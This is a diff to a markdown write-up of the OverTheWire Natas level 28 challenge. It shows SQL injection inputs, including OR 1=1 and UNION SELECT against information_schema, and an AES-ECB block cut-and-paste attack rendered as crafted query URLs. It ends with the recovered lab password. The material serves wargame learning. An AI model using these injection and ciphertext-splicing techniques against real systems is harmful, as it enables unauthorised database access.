@@ -17,7 +17,7 @@ When your hammer is C++, everything begins to look like a thumb.<br>
 Q: What is a computer virus?<br>
 A: A terminal illness!
 
-## What I learned
+## What I learned (This one hard as hell)
 ```
 AES (Advanced Encryption Standard) always uses a block size of 16 bytes (128 bits)
     ECB (Electronic Codebook) mode Block size 16 bytes (128 bits)
@@ -36,16 +36,16 @@ Youtube Solution: https://www.youtube.com/watch?v=oWmfYgCYmCc
 
 ## Solution
 ```
-Messing around with query redirect: http://natas28.natas.labs.overthewire.org/search.php/?query=
+Messing around with query redirect: http://natas28.natas.labs.overthewire.org/search.php/?query= ⌨️
 
 Notice: Uninitialized string offset: -1 in 
 /var/www/natas/natas28/search.php on line 59
 Zero padding found instead of PKCS#7 padding
 
 Search: AAAAAAAAA' OR 1=1 --        # Note: add 1 space at end
-Browser: http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BK
+Browser: http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BK ⌨️
 
-https://gchq.github.io/CyberChef/
+https://gchq.github.io/CyberChef/ ⌨️
 # URL Decode : G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K
 
 # Remove good header (G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP)
@@ -67,7 +67,7 @@ Get more results than default 3
 Search: AAAAAAAAA' UNION SELECT table_name FROM information_schema.tables; -- 
 http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lr0T1ii%2BYsw9O0BMRL2Q9HUY%2BHp7DfIbgLrY9HzzScnSwiwIQQLHbuTybkf0vfvyOoqRnCxfnbDr4842Rxdxh1GSGlUrqRvuT6auFhFtPS9DX%2FytyVFP8KUcB5R9dfA%2BO
 URL Decode:
-http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lr0T1ii+Ysw9O0BMRL2Q9HUY+Hp7DfIbgLrY9HzzScnSwiwIQQLHbuTybkf0vfvyOoqRnCxfnbDr4842Rxdxh1GSGlUrqRvuT6auFhFtPS9DX/ytyVFP8KUcB5R9dfA+O
+http://natas28.natas.labs.overthewire.org/search.php/?query=G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lr0T1ii+Ysw9O0BMRL2Q9HUY+Hp7DfIbgLrY9HzzScnSwiwIQQLHbuTybkf0vfvyOoqRnCxfnbDr4842Rxdxh1GSGlUrqRvuT6auFhFtPS9DX/ytyVFP8KUcB5R9dfA+O ⌨️
 
 Take out the first three blocks (header and bad block):
 r0T1ii+Ysw9O0BMRL2Q9HUY+Hp7DfIbgLrY9HzzScnSwiwIQQLHbuTybkf0vfvyOoqRnCxfnbDr4842Rxdxh1GSGlUrqRvuT6auFhFtPS9DX/ytyVFP8KUcB5R9dfA+O
@@ -110,7 +110,7 @@ URL Encode not work smoothly so needed to:
 G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb%2B76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOntzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D
 
 Put back in base query
-http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb%2B76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOntzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D
+http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb%2B76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOntzil%2F7SkUAJGd1F1rllrvW803zOcae3OEfZlC7ztYnAg%3D%3D ⌨️
 
 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns 🔐
 ```
